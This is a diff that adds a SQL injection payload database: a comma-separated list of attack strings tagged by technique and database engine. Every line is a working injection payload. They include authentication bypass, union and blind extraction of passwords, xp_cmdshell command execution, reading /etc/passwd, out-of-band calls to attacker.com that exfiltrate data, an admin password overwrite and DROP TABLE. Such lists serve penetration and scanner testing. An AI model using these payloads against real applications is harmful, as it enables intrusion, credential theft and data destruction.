@@ -1,0 +1,109 @@
+# SQL Injection Payload Database
+# Format: payload,type,dbms
+
+##########################
+### Basic Authentication Bypass ###
+' OR '1'='1-- ,Boolean-based,Generic
+' OR 1=1-- ,Boolean-based,Generic
+" OR ""=",Boolean-based,Generic
+' OR 'a'='a'-- ,Boolean-based,Generic
+admin' or '1'='1-- ,Boolean-based,Generic
+
+##########################
+### Union-Based Attacks ###
+' UNION SELECT NULL,NULL-- -,Union-based,Generic
+' UNION SELECT @@version,USER()-- -,Union-based,MySQL
+' UNION SELECT banner,NULL FROM v$version-- -,Union-based,Oracle
+' UNION SELECT TOP 1 name FROM sysdatabases-- -,Union-based,MSSQL
+' UNION ALL SELECT table_name FROM information_schema.tables-- -,Union-based,Generic
+
+##########################
+### Error-Based Attacks ###
+' AND 1=CONVERT(int,@@version)-- -,Error-based,MSSQL
+' AND GTID_SUBSET(@@version,0)-- -,Error-based,MySQL
+' AND 1/(SELECT 0 FROM DUAL)-- -,Error-based,Oracle
+') OR 3409=3409 AND ('pytW' LIKE 'pytY-- -,Error-based,Generic
+
+##########################
+### Time-Based Attacks ###
+' OR SLEEP(5)-- ,Time-based,MySQL
+'; WAITFOR DELAY '0:0:5'-- ,Time-based,MSSQL
+'||pg_sleep(5)-- ,Time-based,PostgreSQL
+' AND (SELECT * FROM (SELECT(SLEEP(5)))ecMj)-- ,Time-based,Generic
+
+##########################
+### Out-of-Band Attacks ###
+'; EXEC master..xp_dirtree '\\attacker.com\share'-- ,Out-of-band,MSSQL
+' UNION SELECT LOAD_FILE('\\\\attacker.com\\file')-- ,Out-of-band,MySQL
+'||UTL_HTTP.REQUEST('http://attacker.com/')-- ,Out-of-band,Oracle
+
+##########################
+### Database-Specific Payloads ###
+### MSSQL ###
+'; EXEC xp_cmdshell 'ping 10.10.1.2'-- ,Command-exec,MSSQL
+' AND 1=CAST(@@VERSION AS INT)-- ,Error-based,MSSQL
+
+### MySQL ###
+1' AND (SELECT 1 FROM (SELECT BENCHMARK(5000000,MD5('test')))x)-- ,Time-based,MySQL
+' AND (SELECT 1 FROM DUAL WHERE 1=1 AND 1=1)-- ,Boolean-based,MySQL
+
+### Oracle ###
+' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version))-- ,Error-based,Oracle
+'||DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- ,Time-based,Oracle
+
+##########################
+### File Operations ###
+1' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- ,File-read,MySQL
+' UNION ALL SELECT NULL, (SELECT XMLType(dbms_xmlgen.getxml('select * from all_users')) FROM DUAL-- ,File-read,Oracle
+
+##########################
+### Obfuscated Payloads ###
+'/**/OR/**/1/**/=/**/1-- ,Obfuscated-boolean,Generic
+%27%20OR%201%3D1-- ,URL-encoded-boolean,Generic
+'%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%6e%75%6c%6c-- ,Hex-encoded,Generic
+
+##########################
+### Second-Order Attacks ###
+'; UPDATE users SET password='hacked' WHERE user='admin'-- ,Second-order,Generic
+'; INSERT INTO logs VALUES (USER(), CURRENT_TIMESTAMP)-- ,Second-order,Generic
+
+##########################
+### WAF Bypass Techniques ###
+' /*!50000OR*/ 1=1-- ,MySQL-comment-bypass,MySQL
+' XOR (SELECT 1)-- ,Alternative-logic,MySQL
+' || (SELECT 0xAAAAAAAAAAAAAAAAAAAAA)-- ,Long-hex-string,Generic
+
+##########################
+### Boolean Extraction ###
+' AND ASCII(SUBSTR((SELECT USER()),1,1))>97-- ,Boolean-extract,Generic
+' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'-- ,Boolean-extract,Generic
+
+##########################
+### Stacked Queries ###
+'; DROP TABLE users-- ,Destructive,Generic
+'; BEGIN DECLARE @x VARCHAR(8000); SET @x='...'; EXEC(@x)-- ,Stacked-query,MSSQL
+
+##########################
+### JSON/XPATH Injection ###
+' AND JSON_EXTRACT('{"a":1}', '$.**')=1-- ,JSON-based,MySQL
+' and extractvalue(1,concat(0x7e,(select user())))-- ,XPath-error,MySQL
+
+##########################
+### NoSQL Hybrid ###
+' || 1==1// ,NoSQL-hybrid,MongoDB
+'; sleep(5000);// ,NoSQL-time-based,MongoDB
+
+##########################
+### Blind Payloads ###
+' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)-- ,Blind-boolean,Generic
+'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'-- ,Blind-time-based,MSSQL
+
+##########################
+### Polyglot Payloads ###
+'/*!UNION*/+/*!SELECT*/+1,2,3-- ,Polyglot,Multi-db
+' S%26ELECT%20*%20FROM%20users-- ,URL-encoded-polyglot,Generic
+
+##########################
+### Content Discovery ###
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- ,Schema-dump,Generic
+' AND (SELECT COUNT(*) FROM all_tables)>0-- ,Schema-check,Oracle
